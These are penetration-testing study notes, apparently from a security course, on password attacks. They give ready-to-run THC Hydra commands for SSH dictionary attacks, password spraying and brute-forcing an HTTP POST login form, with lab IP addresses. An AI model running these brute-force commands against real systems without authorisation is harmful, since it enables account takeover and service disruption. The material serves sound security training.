
# PASSWORD ATTACKS

## Attacking Network Services Login

### Common SSH and RDP Services Using THC Hydra

- Popular wordlist: `rockyou.txt`
- Always start with:
  - `nmap -p-`
  - `nmap -sV` to identify interesting ports
- Prepare `rockyou.txt` since it is compressed:
  ```bash
  gzip -d rockyou.txt.gz
  ```

### Hydra Syntax
```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s <port> <protocol>://<IP>
```
**Example**:
```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.50.201
```

- You can enumerate for usernames or attack built-in accounts (e.g. `root`, `Administrator`).

---

## Password Spraying

- Single password tested against a variety of usernames.
- For password spraying to work, usernames must exist in the wordlist.
- Appending to a wordlist:
  ```bash
  echo -e "<name>\n<name>\n<name>" | sudo tee -a /usr/share/wordlists/dirb/others/name.txt
  ```

- Hydra syntax:
  ```bash
  hydra -L /usr/share/wordlists/dirb/others/name.txt -p "<password>" <service>://<IP>
  ```

- Discovered passwords can be leveraged against other systems to detect password reuse.

**Warning**: Dictionary attacks generate a lot of traffic and can destabilize production systems or trigger security alerts.

**Notes**:
- `-p` vs `-P`: Single password vs password list.
- `-l` vs `-L`: Single username vs username list.

---

## HTTP POST Login Attacks

- Required when login is through a web server.
- Many web services have default accounts (e.g. `admin`).

### Steps:
1. Use Burp Suite to capture a POST login attempt.
2. Identify the failed login response text.
3. Use Hydra with HTTP POST form:
    ```bash
    hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
    ```

- `^PASS^` is the password placeholder.
